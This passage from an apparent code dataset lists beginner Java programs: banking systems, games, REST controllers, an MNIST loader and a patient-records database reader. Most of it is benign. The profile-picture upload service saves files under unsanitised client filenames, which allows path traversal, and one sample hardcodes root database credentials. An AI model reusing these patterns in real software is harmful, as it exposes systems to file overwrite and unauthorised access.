{\r\n            if (account.getBalance() >= amount) {\r\n                account.withdraw(amount);\r\n                saveData();\r\n                System.out.println(\"Withdrew \" + amount + \" from account \" + accountNumber + \".\");\r\n            } else {\r\n                System.out.println(\"Insufficient funds.\");\r\n            }\r\n        } else {\r\n            System.out.println(\"Account not found.\");\r\n        }\r\n    }\r\n\r\n    public void transfer(String fromAccount, String toAccount, double amount) {\r\n        Account from = getAccount(fromAccount);\r\n        Account to = getAccount(toAccount);\r\n        if (from != null && to != null) {\r\n            if (from.getBalance() >= amount) {\r\n                from.withdraw(amount);\r\n                to.deposit(amount);\r\n                saveData();\r\n                System.out.println(\"Transferred \" + amount + \" from account \" + fromAccount + \" to account \" + toAccount + \".\");\r\n            } else {\r\n                System.out.println(\"Insufficient funds.\");\r\n            }\r\n        } else {\r\n            System.out.println(\"One or both accounts not found.\");\r\n        }\r\n    }\r\n\r\n    public void displayBalance(String accountNumber) {\r\n        Account account = getAccount(accountNumber);\r\n        if (account != null) {\r\n            System.out.println(\"Balance for account \" + accountNumber + \": \" + account.getBalance());\r\n        } else {\r\n            System.out.println(\"Account not found.\");\r\n        }\r\n    }\r\n\r\n    private Account getAccount(String accountNumber) {\r\n        for (Account account : accounts) {\r\n            if (account.getAccountNumber().equals(accountNumber)) {\r\n                return account;\r\n            }\r\n        }\r\n        return null;\r\n    }\r\n}\r\n\r\nclass Account {\r\n    private String accountNumber;\r\n    private String name;\r\n    private double balance;\r\n\r\n    public Account(String accountNumber, String name, double balance) {\r\n        this.accountNumber = accountNumber;\r\n        this.name = name;\r\n        this.balance = balance;\r\n    }\r\n\r\n    public String getAccountNumber() {\r\n        return accountNumber;\r\n    }\r\n\r\n    public String getName() {\r\n        return name;\r\n    }\r\n\r\n    public double getBalance() {\r\n        return bal",
    "package MonPackage;\r\nimport java.util.*;\r\n\r\npublic class Devinette_Mot\r\n{\r\n\tpublic static void main(String[] args)\r\n\t{\r\n\t\t//Saisie du mot \u00e0 deviner\r\n\t\tString Mot = Saisie.lire_String(\"L'ordinateur saisit un mot de mininum 5 lettres :\");\r\n\t\twhile (Mot.length() < 5)\r\n\t\t{\r\n\t\t\tMot = Saisie.lire_String(\"Erreur, l'ordinateur doit saisir un mot de minimum 5 lettres :\");\r\n\t\t}\r\n\t\tchar[] MotSaisi = Mot.toCharArray();\r\n\t\t\r\n\t\t//D\u00e9claration et instanciation des variables de la boucle\r\n\t\tint LongueurMot = MotSaisi.length, Essais = LongueurMot - 2, x = 0;\r\n\t\tboolean fin = false;\r\n\t\tchar[] LettresCommunes = new char[LongueurMot];\r\n\t\t\r\n\t\t//Boucle qui s'ex\u00e9cute tant que le mot n'est pas trouv\u00e9 ou qu'il reste des essais pour le trouver\r\n\t\twhile(Essais != 0 && fin == false)\r\n\t\t{\r\n\t\t\t//Saisie d'un essai de mot \u00e0 deviner\r\n\t\t\tString Essai = Saisie.lire_String(\"Vous avez \" + Essais + \" essais pour deviner le mot de \" + LongueurMot + \" lettres (tapez SOL pour arr\u00eater) :\");\r\n\t\t\t\r\n\t\t\t//La solution s'affiche si l'utilisateur d\u00e9cide de taper SOL\r\n\t\t\tif (Essai.equals(\"SOL\"))\r\n\t\t\t{\r\n\t\t\t\tEssais = 0;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\twhile (Essai.length() != LongueurMot)\r\n\t\t\t{\r\n\t\t\t\tEssai = Saisie.lire_String(\"Erreur, le mot \u00e0 deviner contient \" + LongueurMot + \" lettres :\");\r\n\t\t\t}\r\n\t\t\tchar[] EssaiSaisi = Essai.toCharArray();\r\n\t\t\tEssais--;\r\n\t\t\tint NbrLettresCommunes = 0;\r\n\t\t\t\r\n\t\t\t//Si le mot est trouv\u00e9, fin du jeu\r\n\t\t\tif(Arrays.equals(EssaiSaisi, MotSaisi))\r\n\t\t\t{\r\n\t\t\t\tfin = true;\r\n\t\t\t}\r\n\t\t\r\n\t\t\t//Sinon on cherche et affiche les lettres communes entre le mot \u00e0 deviner et le mot de l'essai\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tfor (x=0; x < LongueurMot; x++)\r\n\t\t\t\t{\r\n\t\t\t\t\tif (MotSaisi[x] == EssaiSaisi[x])\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tNbrLettresCommunes++;\r\n\t\t\t\t\t\tLettresCommunes[x] = EssaiSaisi[x];\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse if (EssaiSaisi[x] != MotSaisi[x])\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tLettresCommunes[x] = '_';\r\n\t\t\t\t\t}\r\n\t\t\t\t}\t\t\t\t\r\n\t\t\t\t//Affichage et comptage des lettres communes et bien plac\u00e9es\r\n\t\t\t\tSystem.out.print(\"Vous avez trouv\u00e9 \" + NbrLettresCommunes + \" lettres qui sont les suivantes : \");\r\n\t\t\t\tfor (x=0; x < LongueurMot; x++)\r\n\t\t\t\t{\r\n\t\t\t\t\tSystem.out.print(LettresCommunes[x] + \" \");\r\n\t\t\t\t}\r\n\t\t\t\tSystem.out.println(\"\");\r\n\t\t\t}\r\n\t\t}\r\n\t\t//Messages qui s'affichent si le joueur perd ou gagne\r\n\t\tif (Essais == 0) System.out.println(\"Perdu ! Le mot \u00e9tait \" + Mot);\r\n\t\telse System.out.println(\"F\u00e9licitations, vous avez devin\u00e9 le mot en \" + ((Mot.length() - 2) - Essais) + \" essai(s) !\");\t\r\n\t}\r\n\r\n}",
    "package com.rest.controller;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.DeleteMapping;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.PutMapping;\nimport org.springframework.web.bind.annotation.RequestBody;\nimport org.springframework.web.bind.annotation.ResponseBody;\nimport org.springframework.web.bind.annotation.RestController;\n\nimport com.rest.request.PassangerRequest;\nimport com.rest.response.TicketResponse;\nimport com.rest.service.IrctcService;\n\n@RestController\npublic class IrctcRestController {\n\n\t@Autowired\n\tprivate IrctcService service;\n\t\n\t@PostMapping(value=\"/bookticket\", consumes= {\"application/xml\", \"application/json\"})\n\tpublic ResponseEntity<String> bookTicket(@RequestBody PassangerRequest request){\n\t\t\n\t\tString pnr = service.bookTicket(request);\n\t\tString msg = \"Ticket Booking Done : \" + pnr;\n\t\treturn new ResponseEntity<>(msg, HttpStatus.CREATED);\n\t}\n\t\n\t@GetMapping(value=\"/ticket/{pnr}\", produces= {\"application/xml\", \"application/json\"})\n\tpublic ResponseEntity<TicketResponse> getTicket(@PathVariable String pnr){\n\t\t\n\t\tTicketResponse ticket = service.GetTicketByPnr(pnr);\n\t\treturn new ResponseEntity<>(ticket, HttpStatus.OK);\n\t\t\n\t}\n\t\n\t@PutMapping(value=\"/ticket/update\", consumes = {\"application/xml\", \"application/json\"} )\n\tpublic ResponseEntity<String> updateTicket(@RequestBody TicketResponse ticket){\n\t\t\n\t\tString msg = service.UpdateTicket(ticket);\n\t\treturn new ResponseEntity<>(msg,HttpStatus.OK );\n\t} \n\t\n\t@DeleteMapping(\"/ticket/{pnr}\")\n\tpublic ResponseEntity<String> deleteTicket(@PathVariable String pnr){\n\t\t\n\t\tString msg = service.DeleteTicket(pnr);\n\t\treturn new ResponseEntity<>(msg, HttpStatus.OK);\n\t\t\t\t\n\t}\n\t\n}\n",
    "import java.io.*;\nimport java.net.*;\nimport java.text.SimpleDateFormat;\nimport java.util.Random;\nimport java.util.Scanner;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class Hydrogen {\n    private final int HYDROGEN_PORT = 50000;\n    private final String SERVER_IP = \"localhost\";\n    private int id;\n\n    public Hydrogen(int id) {\n        this.id = id;\n    }\n\n    public void start() {\n        Socket socket = null;\n        PrintWriter out = null;\n        BufferedReader in = null;\n        try {\n            socket = new Socket(SERVER_IP, HYDROGEN_PORT);\n            System.out.println(\"Connected to server\");\n            out = new PrintWriter(socket.getOutputStream(), true);\n            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            Random random = new Random();\n\n            Scanner scanner = new Scanner(System.in);\n            int n = 0;\n            do {\n                System.out.println(\"Enter the number of hydrogen molecules:\");\n                System.out.flush();\n                n = scanner.nextInt();\n                if (n <= 0)\n                    System.out.println(\"Enter a valid number of hydrogen molecules\");\n            } while (n <= 0);\n\n            long startTime = System.currentTimeMillis();\n            n = n * 2;\n            AtomicBoolean bondingComplete = new AtomicBoolean(false); // Flag to track if bonding is complete\n            for (int ID = 1; ID <= n && !bondingComplete.get(); ID++) {\n                int randomTime = random.nextInt(1000 - 50) + 50;\n                String timeStamp = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\").format(new java.util.Date());\n                String request = \"H\" + ID + \", request, \" + timeStamp;\n\n                System.out.println(request);\n                out.println(request);\n                Thread.sleep(randomTime);\n\n                // Check if bonding is complete asynchronously\n                BufferedReader finalIn = in;\n                new Thread(() -> {\n                    try {\n                        String serverResponse;\n                        while ((serverResponse = finalIn.readLine()) != null) {\n                            if (serverResponse.contains(\"Insufficient molecules for bonding\")) {\n                                System.out.println(serverResponse);\n                                bondingComplete.set(true); // Set flag to true to exit loop\n                                break; // Exit loop if bonding is complete\n                            }\n                            System.out.println(serverResponse);\n                        }\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }).start();\n\n                if (bondingComplete.get()) {\n                    break; // Exit loop if bonding is complete\n                }\n            }\n\n            long endTime = System.currentTimeMillis();\n            System.out.println(\"== END ==\");\n            System.out.println(\"Runtime: \" + (endTime - startTime) + \" milliseconds\");\n            System.exit(0);\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (in != null) {\n                    in.close(); // Close the input stream\n                }\n                if (out != null) {\n                    out.close(); // Close the output stream\n                }\n                if (socket != null) {\n                    socket.close(); // Close the socket\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n    }\n\n    public static void main(String[] args) {\n        Hydrogen hydrogen = new Hydrogen(1); // Assuming ID starts from 1\n        hydrogen.start();\n    }\n}\n",
    "package com.example.basicbankingsystem;\n\nimport org.springframework.stereotype.Service;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n@Service\npublic class BankService {\n    private final Map<String, BankAccount> accounts = new HashMap<>();\n\n    public void createAccount(String accountNumber, String ownerName, double initialBalance) {\n        BankAccount account = new SimpleBankAccount(accountNumber, ownerName, initialBalance);\n        accounts.put(accountNumber, account);\n    }\n\n    public BankAccount getAccount(String accountNumber) throws BankException {\n        BankAccount account = accounts.get(accountNumber);\n        if (account == null) {\n            throw new BankException(\"Account not found\");\n        }\n        return account;\n    }\n\n    public void deposit(String accountNumber, double amount) throws BankException {\n        BankAccount account = getAccount(accountNumber);\n        account.deposit(amount);\n    }\n\n    public void withdraw(String accountNumber, double amount) throws BankException {\n        BankAccount account = getAccount(accountNumber);\n        account.withdraw(amount);\n    }\n\n    public void transfer(String senderAccountNumber, String recipientAccountNumber, double amount) throws BankException {\n        BankAccount senderAccount = getAccount(senderAccountNumber);\n        BankAccount recipientAccount = getAccount(recipientAccountNumber);\n        senderAccount.transfer(recipientAccount, amount);\n    }\n}",
    "package com.enigma.superwallet.service.impl;\n\nimport com.enigma.superwallet.dto.request.ProfilePictureRequest;\nimport com.enigma.superwallet.dto.response.ProfilePictureResponse;\nimport com.enigma.superwallet.entity.ProfilePicture;\nimport com.enigma.superwallet.repository.ProfileImageRepository;\nimport lombok.RequiredArgsConstructor;\nimport org.springframework.core.io.Resource;\nimport org.springframework.core.io.UrlResource;\nimport org.springframework.stereotype.Service;\nimport org.springframework.web.multipart.MultipartFile;\n\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.net.MalformedURLException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\nimport java.time.LocalDateTime;\n\n@Service\n@RequiredArgsConstructor\npublic class ProfilePictureService {\n    private final Path fileStorageLocation = Paths.get(\"/home/user/Batch14/finalProject/SuperWallet/v2/super-wallet-backend/src/main/resources/static\");\n    private final ProfileImageRepository profileImageRepository;\n\n    public ProfilePictureResponse uploadPicture(ProfilePictureRequest profilePictureRequest) {\n        String mimiType = profilePictureRequest.getImage().getContentType();\n\n        if(mimiType == null || (!mimiType.startsWith(\"image/\"))) {\n            throw new RuntimeException(\"Invalid Upload, Only Image\");\n        }\n        try {\n            Path targetLocation = this.fileStorageLocation.resolve(profilePictureRequest.getImage().getOriginalFilename());\n            Files.copy(profilePictureRequest.getImage().getInputStream(),targetLocation, StandardCopyOption.REPLACE_EXISTING);\n            ProfilePicture profilePicture = ProfilePicture.builder()\n                    .name(profilePictureRequest.getImage().getOriginalFilename())\n                    .uploadedAt(LocalDateTime.now()).build();\n            profileImageRepository.saveAndFlush(profilePicture);\n\n        }catch (IOException e) {\n            throw new RuntimeException(\"Could Not Store\" + profilePictureRequest.getImage().getOriginalFilename());\n        }\n\n        return ProfilePictureResponse.builder()\n                .fileName(profilePictureRequest.getImage().getOriginalFilename())\n                .dateTime(LocalDateTime.now()).build();\n    }\n\n    public Resource getProfilePicture(String name) throws FileNotFoundException, MalformedURLException {\n        try{\n            Path targetLocation = this.fileStorageLocation.resolve(name).normalize();\n            Resource resource = new UrlResource(targetLocation.toUri());\n\n            if(resource.exists()){\n                return resource;\n            }else {\n                throw new FileNotFoundException(\"File not Found\" + name);\n            }\n        }catch (MalformedURLException e) {\n            throw new FileNotFoundException(\"File not Found\" + name);\n        }\n    }\n}\n",
    "package app;\n\nimport java.util.Scanner;\n\npublic class CoffeeMachine {\n    private static Scanner scanner = new Scanner(System.in);\n\n    public static void displayMenu() {\n        System.out.println(\"Choose a drink:\");\n        System.out.println(\"1 - Espresso\");\n        System.out.println(\"2 - Cappuccino\");\n        System.out.println(\"3 - Latte\");\n    }\n\n    public static int getUserChoice() {\n        System.out.print(\"Enter your choice: \");\n        while (!scanner.hasNextInt()) {\n            System.out.println(\"Invalid input. Please enter a number.\");\n            scanner.next();\n        }\n        return scanner.nextInt();\n    }\n\n    public static void prepareDrink(int choice) {\n        Beverage beverage;\n        switch (choice) {\n            case 1:\n                beverage = new Espresso();\n                break;\n            case 2:\n                beverage = new Cappuccino();\n                break;\n            case 3:\n                beverage = new Latte();\n                break;\n            default:\n                System.out.println(\"Invalid choice. Please select a valid drink.\");\n                return;\n        }\n        beverage.make();\n    }\n}\n\n",
    "package com.james.api.enums;\n\nimport com.james.api.account.AccountController;\n\nimport java.util.Scanner;\nimport java.util.function.Function;\nimport java.util.stream.Stream;\n\npublic enum AccountRouter {\n    Exit(\"x\",scanner -> {\n        System.out.println(\"Exit\");\n        return 0;\n    }),\n    Create(\"cat\",scanner -> {\n        System.out.println(\"create account table\");\n        AccountController.getInstance().createAccount(scanner);\n        return 1;\n    }),\n    Deposit(\"depo\",scanner -> {\n        System.out.println(\"deposit \");\n        AccountController.getInstance().deposit(scanner);\n        return 1;\n    }),\n    Withdraw(\"with\",scanner -> {\n        System.out.println(\"withdraw\");\n        AccountController.getInstance().withdraw(scanner);\n        return 1;\n    }),\n    Getbalance(\"bal\",scanner -> {\n        System.out.println(\"getbalance\");\n        AccountController.getInstance().getBalance(scanner);\n        return 1;\n    }),\n    Delete(\"rm\",scanner -> {\n        System.out.println(\"delete\");\n        AccountController.getInstance().delete(scanner);\n        return 1;\n    }),\n    GetAccount(\"ls-a\",scanner -> {\n        System.out.println(\"getaccount\");\n        AccountController.getInstance().getAccounts();\n        return 1;\n    }),\n    CreateTable(\"touch\",scanner -> {\n        System.out.println(\"create table\");\n        return 1;\n    })\n    ;\n    private final String string;\n    private final Function<Scanner,Integer> function;\n\n    AccountRouter(String string, Function<Scanner, Integer> function) {\n        this.string = string;\n        this.function = function;\n    }\n\n    public static Integer menu(Scanner sc) {\n        System.out.println(\"menu \uc120\ud0dd\");\n        String s = sc.next();\n        return Stream.of(values())\n                .filter(i->i.string.equals(s))\n                .findFirst().orElseThrow()\n                .function.apply(sc);\n    }\n}\n",
    "package org.example;\r\nimport java.util.Scanner;\r\n\r\npublic class GeneralUser {\r\n    static Scanner scan = new Scanner(System.in);\r\n\r\n    public static void normal(String username) {\r\n\r\n        System.out.println(\"==============================================================================\");\r\n        System.out.println(\"Choose a number\");\r\n        System.out.println(\"1: View locations\");\r\n        System.out.println(\"2: Enter your location and know the climatic condition of your place\");\r\n        System.out.println(\"3: News on Climate change\");\r\n        System.out.println(\"4: Play Quiz\");\r\n        System.out.println(\"5: Logout\");\r\n        System.out.println(\"6: Exit\");\r\n\r\n        int num = scan.nextInt();\r\n        scan.nextLine();\r\n\r\n        if (num == 1) {\r\n            for (String location : Admin.locations) {\r\n                System.out.println(location);\r\n            }\r\n            if (Admin.locations.isEmpty()) {\r\n                System.out.println(\"No locations are added\");\r\n            }\r\n            normal(\"\");\r\n        } else if (num == 2) {\r\n            System.out.println(\"Enter your location\");\r\n            String location = scan.next();\r\n\r\n            if (Admin.locations.contains(location)) {\r\n                for (int i = 0; i < Admin.locations.size(); i++) {\r\n                    if (Admin.locations.get(i).equals(location)) {\r\n                        String locationName = Admin.locations.get(i);\r\n                        String climateCondition = Admin.climate.get(i);\r\n                        String risk = Admin.Risks.get(i);\r\n                        String preventiveMeasure = Admin.Pmeasures.get(i);\r\n\r\n                        System.out.println(\"Climatic condition of \" + locationName + \" respectively: \" + climateCondition);\r\n                        System.out.println(\"Risks due to climatic condition of \" + locationName + \" respectively: \" + risk);\r\n                        System.out.println(\"Preventive measure of risks due to climate of  \" + locationName + \" respectively: \" + preventiveMeasure);\r\n\r\n                        break;\r\n                    }\r\n                }\r\n            } else {\r\n                System.out.println(\"Location not found\");\r\n            }\r\n            normal(\"\");\r\n        } else if (num == 3) {\r\n            Admin.news();\r\n            normal(\"\");\r\n        } else if (num == 4) {\r\n            // Quiz logic here\r\n            normal(\"\");\r\n        } else if (num == 5) {\r\n            Login.userLogin();\r\n        } else if (num == 6) {\r\n            System.out.println(\"Thank you for participating and learning about climate change.\");\r\n            System.out.println(\"Remember, every action counts in protecting our planet!\");\r\n            System.out.println(\"Stay cool and keep the planet greener! Catch you later, eco-warrior. Don't forget to stay updated for more climate tips!\");\r\n            System.out.println(\"Ba-bye for now!\ud83c\udf31\u2728\");\r\n            System.exit(0); /\r\n        }\r\n    }\r\n}\r\n",
    "package com.sample;\r\n\r\nimport java.io.File;\r\nimport java.io.IOException;\r\nimport java.nio.file.Files;\r\n\r\npublic class ReadMnist {\r\n\t\r\n\tpublic float[][] images;\r\n\tpublic float[][] labels;\r\n\tpublic float[][] test_images;\r\n\tpublic float[][] test_labels;\r\n\t\r\n\tpublic ReadMnist() {\r\n\t\t\r\n\t\tFile file = new File(getClass().getResource(\r\n\t\t\t\t\"resources/train-images.idx3-ubyte\").getPath());\r\n\t\t\r\n\t\tFile file1 = new File(getClass().getResource(\r\n\t\t\t\t\"resources/train-labels.idx1-ubyte\").getPath());\r\n\t\t\r\n\t\tFile file2 = new File(getClass().getResource(\r\n\t\t\t\t\"resources/t10k-images.idx3-ubyte\").getPath());\r\n\t\t\r\n\t\tFile file3 = new File(getClass().getResource(\r\n\t\t\t\t\"resources/t10k-labels.idx1-ubyte\").getPath());\r\n\t\t\r\n\t\timages = imagesTofloatArray(file);\r\n\t\tlabels = labelsTofloatArray(file1);\r\n\t\ttest_images = imagesTofloatArray(file2);\r\n\t\ttest_labels = labelsTofloatArray(file3);\r\n\t}\r\n\t\r\n\t\r\n\t\r\n\tpublic float[][] imagesTofloatArray(File file) {\r\n\t\tlong size = file.length();\r\n\t\tSystem.out.println(\"Images size: \" + size);\r\n\t\t\r\n\t\tbyte[] conteudo = null;\r\n\t\t\r\n\t\ttry {\r\n\t\t\tconteudo = Files.readAllBytes(file.toPath());\r\n\t\t} catch (IOException e) {\r\n\t\t\te.printStackTrace();\r\n\t\t}\r\n\t\t\r\n\t\tfloat[][] r = new float[(int) ((size-16)/784)][784];\r\n\t\t\r\n\t\tlong cont = 16;\r\n\t\t\r\n\t\tfor (int k = 0; k < r.length; k ++) {\r\n\t\t\tfor (int i = 0; i < 784; i++) {\r\n\t\t\t\tr[k][i] = Byte.toUnsignedInt(conteudo[(int) cont])/255.0f;\r\n\t\t\t\tcont++;\r\n\t\t\t}\r\n\t\t}\r\n\t\t\t\r\n\t\treturn r;\r\n\t}\r\n\t\r\n\tpublic float[][] labelsTofloatArray(File file) {\r\n\t\tlong size = file.length();\r\n\t\tSystem.out.println(\"Labels size: \" + size);\r\n\t\t\r\n\t\tbyte[] conteudo = null;\r\n\t\t\r\n\t\ttry {\r\n\t\t\tconteudo = Files.readAllBytes(file.toPath());\r\n\t\t} catch (IOException e) {\r\n\t\t\te.printStackTrace();\r\n\t\t}\r\n\t\t\r\n\t\tfloat[][] r = new float[(int) (size-8)][10];\r\n\t\t\r\n\t\tlong cont = 8;\r\n\t\t\r\n\t\tfor (int k = 0; k < r.length; k ++) {\r\n\t\t\tr[k][Byte.toUnsignedInt(conteudo[(int) cont])] = 1;\r\n\t\t\tcont++;\r\n\t\t}\r\n\t\t\t\r\n\t\treturn r;\r\n\t}\r\n}",
    "import java.sql.Connection;\r\nimport java.sql.DriverManager;\r\nimport java.sql.ResultSet;\r\nimport java.sql.SQLException;\r\nimport java.sql.Statement;\r\n\r\npublic class PatientRecords {\r\n\r\n    public static void main(String[] args) {\r\n\r\n        String dbURL = \"jdbc:mysql://localhost:3306/patient\";\r\n        String username = \"root\";\r\n        String password = \"root\";\r\n\r\n        Connection connection = null;\r\n        Statement statement = null;\r\n        ResultSet resultSet = null;\r\n\r\n        try {\r\n\r\n            Class.forName(\"com.mysql.jdbc.Driver\");\r\n\r\n            connection = DriverManager.getConnection(dbURL, username, password);\r\n\r\n            statement = connection.createStatement();\r\n\r\n            String query = \"SELECT id, name, problem, bill FROM patients\";\r\n\r\n            resultSet = statement.executeQuery(query);\r\n\r\n            System.out.println(\"Patient Records:\");\r\n            while (resultSet.next()) {\r\n                int id = resultSet.getInt(\"id\");\r\n                String name = resultSet.getString(\"name\");\r\n                String problem = resultSet.getString(\"problem\");\r\n                double bill = resultSet.getDouble(\"bill\");\r\n\r\n                System.out.println(\"ID: \" + id);\r\n                System.out.println(\"Name: \" + name);\r\n                System.out.println(\"Problem: \" + problem);\r\n                System.out.println(\"Bill: $\" + bill);\r\n                System.out.println(\"---------------------\");\r\n            }\r\n\r\n        } catch (ClassNotFoundException e) {\r\n            System.out.println(\"Error: MySQL JDBC driver not found!\");\r\n            e.printStackTrace();\r\n\r\n        } catch (SQLException e) {\r\n            System.out.println(\"Error: Connection or query execution failed!\");\r\n            e.printStackTrace();\r\n\r\n        } finally {\r\n\r\n            try {\r\n                if (resultSet != null) {\r\n                    resultSet.close();\r\n                }\r\n                if (statement != null) {\r\n                    statement.close();\r\n                }\r\n                if (connection != null) {\r\n                    connection.close();\r\n                }\r\n            } catch (SQLException e) {\r\n                System.out.println(\"Error: Unable to close resources!\");\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n    }\r\n}\r\n",
    "import java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        int[] massiv0 = new int[5]; //\u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 \u0438 \u0432\u044b\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u043f\u0430\u043c\u044f\u0442\u0438 \u0434\u043b\u044f 5 \u0446\u0435\u043b\u044b\u0445 \u0447\u0438\u0441\u0435\u043b\n        //\u043c\u0430\u0441\u0441\u0438\u0432 \u0443\u0436\u0435 \u0437\u0430\u043f\u043e\u043b\u043d\u0435\u043d 0\n        int[] massiv1 = {12, 16, 13, -8, 7, 9};\n\n        int[] massiv2 = inputArray();\n\n       // printArray(\"\u043c\u0430\u0441\u0441\u0438\u04320 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \", massiv0);\n       // printArray(\"\u043c\u0430\u0441\u0441\u0438\u04321 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \", massiv1);\n        printArray(\"\u043c\u0430\u0441\u0441\u0438\u04322 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \", massiv2);\n       // fillArray(massiv0, 193);\n       // printArray(\"\u043c\u0430\u0441\u0441\u0438\u04320 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \", massiv0);\n\n\n//        printArray(\"\u043c\u0430\u0441\u0441\u0438\u04322 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \", massiv2);\n\n    }\n\n    private static void printArray(String message, int[] massiv) {\n        System.out.println(message + massiv.length + \" \u0447\u0438\u0441\u0435\u043b\");\n        for (int i = 0; i < massiv.length; i++) {\n            System.out.println(massiv[i]);\n        }\n    }\n\n    public static void fillArray(int[] m, int filler)\n    {\n        for (int i = 0; i < m.length; i++) {\n            m[i] = filler;\n        }\n    }\n\n    public static void readArray(int[] m)\n    {\n        Scanner scanner = new Scanner(System.in);\n        int value;\n        System.out.println(\"\u0432\u0432\u0435\u0434\u0438\u0442\u0435 \"+m.length+\" \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u043c\u0430\u0441\u0441\u0438\u0432\u0430\");\n        for (int i = 0; i < m.length; i++) {\n            value = scanner.nextInt();\n            m[i] = value;\n        }\n    }\n\n    public static int[] inputArray(){\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"\u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u0440\u0430\u0437\u043c\u0435\u0440 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 2\");\n        int size = scanner.nextInt();\n        int[] m = new int[size];\n        readArray(m);\n        return m;\n    }\n}",
    "package clinicSystem;\n\nimport java.util.Objects;\n\npublic class personalInfo {\n\n    Integer id;\n    Integer age;\n    String bloodType;\n\n    public Integer getId() {\n        return id;\n    }\n\n    public void setId(Integer id) {\n        this.id = id;\n    }\n\n    public Integer getAge() {\n        return age;\n    }\n\n    public void setAge(Integer age) {\n        this.age = age;\n    }\n\n    public String getBloodType() {\n        return bloodType;\n    }\n\n    public void setBloodType(String bloodType) {\n        this.bloodType = bloodType;\n    }\n\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        personalInfo that = (personalInfo) o;\n        return Objects.equals(age, that.age) && Objects.equals(bloodType, that.bloodType);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(age, bloodType);\n    }\n\n    @Override\n    public String toString() {\n        return \"personalInfo{\" +\n                \"id=\" + id +\n                \", age=\" + age +\n                \", bloodType='\" + bloodType + '\\'' +\n                '}';\n    }\n}\n\n\n",
    "package com.liang.concurrencypractice.heima.\u54f2\u5b66\u5bb6\u5c31\u9910;\n\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.util.concurrent.TimeUnit;\n\n@Slf4j\npublic class Test1 {\n    public static void main(String[] args) {\n        Chopstick c1 = new Chopstick(\"1\");\n        Chopstick c2 = new Chopstick(\"2\");\n        Chopstick c3 = new Chopstick(\"3\");\n        Chopstick c4 = new Chopstick(\"4\");\n        Chopstick c5 = new Chopstick(\"5\");\n\n        new Philosopher(\"\u82cf\u683c\u62c9\u5e95\",c1,c2).start();\n        new Philosopher(\"\u5f20\u826f\",c2,c3).start();\n        new Philosopher(\"\u5173\u7fbd\",c3,c4).start();\n        new Philosopher(\"\u8d75\u4e91\",c4,c5).start();\n        new Philosopher(\"\u5218\u90a6\",c5,c1).start();\n\n    }\n}\n\n\n@Slf4j\nclass Chopstick {\n    String name;\n\n    public Chopstick(String name) {\n        this.name = name;\n    }\n\n    @Override\n    public String toString() {\n        return \"\u7b77\u5b50{\" + name + '}';\n    }\n}\n\n@Slf4j\nclass Philosopher extends Thread {\n    Chopstick left;\n    Chopstick right;\n\n    public Philosopher(String name, Chopstick left, Chopstick right) {\n        super(name);\n        this.left = left;\n        this.right = right;\n    }\n\n    private void eat() {\n        log.info(\"eating...\");\n        try {\n            TimeUnit.SECONDS.sleep(1);\n        } catch (InterruptedException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            // \u83b7\u5f97\u5de6\u624b\u7b77\u5b50\n            synchronized (left) {\n                // \u83b7\u5f97\u53f3\u624b\u7b77\u5b50\n                synchronized (right) {\n                    // \u5403\u996d\n                    eat();\n                }\n            }\n        }\n    }\n}\n",
    "import java.io.*;\n\npublic class Main {\n    public static void main(String[] args) {\n        // Specify the file path\n        String filePath = \"D:\\\\Github\\\\Auto-Fix-Prototype\\\\src\\\\Files\\\\Example.java\";\n\n        // Specify the line number you want to edit\n        int lineNumber = 6;\n\n\n        // Specify the new content\n        String newContent = ReadLine(filePath, lineNumber);\n        System.out.println(newContent);\n        newContent = newContent.replaceAll(\"^\\\\s+\", \"\");\n        newContent = \"        \" + newContent;\n\n        try {\n            // Read the contents of the file\n            BufferedReader reader = new BufferedReader(new FileReader(filePath));\n            StringBuilder sb = new StringBuilder();\n            String line;\n            int currentLine = 1;\n            while ((line = reader.readLine()) != null) {\n                // If it's the line you want to edit, replace it with the new content\n                if (currentLine == lineNumber) {\n                    sb.append(newContent).append(\"\\n\");\n                } else {\n                    sb.append(line).append(\"\\n\");\n                }\n                currentLine++;\n            }\n            reader.close();\n\n            // Write the modified contents back to the file\n            BufferedWriter writer = new BufferedWriter(new FileWriter(filePath));\n            writer.write(sb.toString());\n            